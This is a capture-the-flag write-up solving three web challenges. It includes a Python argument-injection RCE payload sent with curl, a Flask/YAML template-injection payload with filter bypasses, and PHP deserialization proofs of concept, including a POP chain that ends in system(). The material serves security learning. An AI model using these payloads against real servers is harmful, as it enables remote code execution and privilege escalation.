--------------

### HACKCON CTF 

----------------

![image](https://github.com/user-attachments/assets/2a3fdfd1-c616-4f65-9554-b4e9018fe752)

----------------

### Challenges-:

----------------

- Web-:
  - Processed Subscription
  - Flask ain't no markup language
  - Zeezy's notes

------------------

### Web

------------------

### Processed Subscription

------------------

![image](https://github.com/user-attachments/assets/edee15aa-4195-4a00-aa61-bb9f8c605ead)

------------------

- Source code analysis, code-:

```python
@app.route('/run_file', methods=['GET'])
def run_code():
    filename = request.args.get("code")
    if filename.endswith(".py"):
       response = subprocess.Popen(["python3",filename],stdout=-1).communicate()
       response =  response[0].decode()
       print(response)
    else:
        response = "Invalid file type"
    return jsonify({'result': response})
```
- The route `run_file` is vulnerable to argument injection.An attacker can control the filename variable and trigger `argument injection` to Remote Code Exection on the server.
- Testing it on a python interpreter before triggering it on the server.

![image](https://github.com/user-attachments/assets/104066ba-c520-4d52-aa79-4a9613c00ccc)

- Normally, Python should only execute a file in this state and should not be vulnerable to `argument injection`.
- Explaining the payload-:

```python3
-c\neval(\"__import__('os').system('id')\")
```

- The `-c` switch triggers the python interpreter, then we use `\n` to slip to the next line.Then, in the next line, we activate our payload.If we try it with the python interpreter, it'll be something like this.

![image](https://github.com/user-attachments/assets/f3f2a683-94ad-4c3e-9a4d-84e2480f27a4)

- Final Payload-:
```
-c%0aeval(\"__import__(\'os\').system('cat%20flag.txt')\")%23.py
```

- Flag-: ```gdscCTF{l0l_tw34k1ng_withSubpr0c3ss}```

```zsh
curl -G https://chall1.pxxl.xyz/run_file -d "code=-c%0aeval(\"__import__(\'os\').system('cat%20flag.txt')\")%23.py"
{"result":"gdscCTF{l0l_tw34k1ng_withSubpr0c3ss}\n"}
```

----------------

### Flask ain't no Markup Language

---------------

![image](https://github.com/user-attachments/assets/5fa6bf38-41f2-42f1-9866-0447c27c6504)

---------------

- Vulnerability is Flask Server Side Template Injection in `yaml`.While executing it, our payload will be place in yaml syntax e.g

```yaml
x: "{{7*7}}"
```

![image](https://github.com/user-attachments/assets/e4fd1bf4-85f5-4ce6-bfb4-ed18a3112ce40)


- Final payload-:

```
x: "{{config.__init__.__globals__.__getitem__('__BUILTINS__'.lower()).__getitem__('__IMPORT__'.lower())('OS'.lower()).popen('base64 /app/fl??/*.txt | base64 -d').read()}}"
```

- You can bypass the filtered strings by setting it to uppercase and passing it to python's lower function as soon as it is parsed.Lastly. the word `flag` gets filtered which you can bypass with regex e.g `fl?? should match flag`.
- Flag-: ```gdscCTF{4c4dae5677c29dcdcd06ba88565602fa}```

![image](https://github.com/user-attachments/assets/9bb1bb33-8913-4bf3-be94-5e2f4796dfe5)

----------------

### Zeezy's notes

-----------------

![image](https://github.com/user-attachments/assets/4c5c3982-9e3b-49ac-8c9c-e83fccba294e)

-----------------

- Vulnerability-: Php Insecure Deserialization(Privesc to Remote Code Execution)

------------------

### Source Code Analysis (Privilege Escalation)

------------------

- Welcome.php-:

```php
/ Check cookie
if (!isset($_COOKIE['APP_SESSID'])) {
    header("Location: login.php");
    exit;
}

// Decode + unserialize cookie
$data = unserialize(base64_decode(urldecode($_COOKIE['APP_SESSID'])),["allowed_classes" => ["User"]]);

// Safety check
if (empty($data->username) && empty($data->role)) {
    header("Location: login.php");
    exit;
}
$username = $data->username;
$role = $data->role;

// Verify username in DB
$stmt = $db->prepare("SELECT * FROM users WHERE username = :username");
$stmt->bindValue(':username', $username, SQLITE3_TEXT);
$result = $stmt->execute()->fetchArray(SQLITE3_ASSOC);

if (!$result) {
    header("Location: login.php");
    exit;
}

// Redirect admin
if ($role === "admin") {
    header("Location: admin.php");
    exit;
}
```

- The main sink in this code is caused by `unserialize()` in php which deserilaizes code and while performing this process, it executes code.It unserializes the cookie and picks the variable `username` which is checked against the db and validated. Although, the `role` is checked with an if statement and not based on the db.We can solve this by creating a valid `User` object with the `role` set to `admin`.User.php-:

```php
<?php
class User {
    public $username;
    public $role;

    // Constructor to initialize a new User object
    public function __construct($username, $role = "user") {
        $this->username = $username;
        $this->role = $role;
    }
}
?>
```

- Proof of concept-:

```php
<?php
class User {
    public $username;
    public $role;
}
//Create a new object

$user = new User;
$user->username = "z";
$user->role = "admin";
$payload = urlencode(base64_encode(serialize($user)));
echo $payload;
?>
```

![image](https://github.com/user-attachments/assets/3c31e676-f1ec-4762-a381-34ddfbcc9f10)

- Admin privileges

![image](https://github.com/user-attachments/assets/0f9482a6-a5a1-4807-9821-2f504487aa48)

----------------

### Remote Code Execution with a custom gadget

----------------

- Most times,PHP object injection is not straight forward as displayed above. It requires abusing some functions to hit your desired aim which  is the beauty of `pop chains`.It requires abusing magic methods which are triggered when a desired condition is met which we'll see below.E.g you might have a vulnerable class but might need other classes to trigger it because of their magic methods.
- Source code of Analysis of `admin.php`, Code's sink-:

```php
if (isset($_COOKIE['ADMIN_NOTES'])) {
    $notes = unserialize(
        base64_decode(urldecode($_COOKIE['ADMIN_NOTES']))
    );
    if (!is_array($notes)) {
        $notes = [];
    }
}
```

- Unserialize() deserializes the `ADMIN_NOTES` cookie in the admin page.

----------------

### Building the POP chain

---------------

- It starts from `Hidden.php`-:

```php
<?php
class Hidden {
    public $command;

    public function __construct($command){
        $this->command = $command;
    }

    public function __invoke() {
        echo system($this->command);
    }
}
?>
```
- The magic method `__invoke` executes any string passed to `command` as a shell command.You can only trigger `__invoke` if the object is treated like a function.
- It moves us to class `Call` .`Call.php`-:

```php
<?php
class Call
{
    public $called;
    public function __get($task)
    {
        ($this->called)();
    }
}
?>
```

- The `Call` class requires the variable `called` which get triggered by `__get` as a function.`__get` is only triggered if the code tries to access an inaccessible attribute in the object. To trigger `Hidden`, we'll pass it to `Call` to trigger it because `$this->called` is treated as a function which triggers `__invoke`.

- The next stop is `Work.php`. `Work.php`-:

```php
<?php
class Work
{
    public $task;
    public function __toString()
    {
        $this->task->action;
    }
}
?>
```

- It uses the `__toString` function to access `$this->task` which tries to access attributes `action` which will obviously be non-existent in `Call`.This will be our next trigger point to execute `__get`.Although, `__toString` is only treated triggered if treated as a string e.g passed to function `echo` which will move us to class `Note`.
- `User.php`-:

```php
<?php
ob_start();
class Note {
    private $title;
    private $content;
    private $createdAt;
    public $mystery;

    public function __construct($title, $content) {
        $this->title = $title;
        $this->content = $content;
        $this->createdAt = date("Y-m-d H:i:s");
    }

    // Getters
    public function getTitle() {
        return $this->title;
    }

    public function getContent() {
        return $this->content;
    }

    public function getCreatedAt() {
        return $this->createdAt;
    }
    public function __destruct() {
        if (!empty($this->mystery)) {
            echo $this->mystery;
        }
    }
}
ob_end_flush();        
?>
```

- You'll notice there is a public attribute `mystery` which is passed to `__destruct` treats `mystery` as a string which helps us to trigger `__toString`. Well, we don't need to worry about `__destruct` because it gets triggered as soon unserialize is done unserializing the object.

```php
public function __destruct() {
        if (!empty($this->mystery)) {
            echo $this->mystery;
        }
```

- Proof of concept-:

```php
<?php
class Note {
    private $title;
    private $content;
    private $createdAt;
    public $mystery;

    public function __construct($title, $content) {
        $this->title = $title;
        $this->content = $content;
        $this->createdAt = date("Y-m-d H:i:s");
    }
}
class Call
{
    public $called;
    public function __get($task)
    {
        ($this->called)();
    }
}
class Hidden {
    public $command;

    public function __construct($command){
        $this->command = $command;
    }

    public function __invoke() {
        echo system($this->command);
    }
}
class Work
{
    public $task;
    public function __toString()
    {
        $this->task->action;
    }
}
//Prepping up hidden
$hidden =  new Hidden('id'); //Tweak me
//Prepping up Call and passing hidden
$call = new Call;
$call->called =  $hidden;
//Prepping up Work and passing call
$work = new Work;
$work->task = $call;
//Prepping up notes and passing Work

$notes = new Note("pwned","pwned");
$notes->mystery = $work;

$payload =  urlencode(base64_encode(serialize($notes)));
echo $payload;
?>
```

![image](https://github.com/user-attachments/assets/2be22947-1c8d-46a7-b913-ff522ec71f47)

- RCE achieved-:

![image](https://github.com/user-attachments/assets/7b6ea0a4-3e3d-40e5-abab-f69b323ad766)

- Reading the flag-:

![image](https://github.com/user-attachments/assets/cbddbf8f-d452-456c-8c9e-896ac926c661)


- Flag-: ```gdscCTF{750bbadee6e299d30c9784972a28f0cb}```

![image](https://github.com/user-attachments/assets/597c0328-a92b-47f7-a558-c4a458479500)

------------------

### Thanks for Reading!!!

-----------------



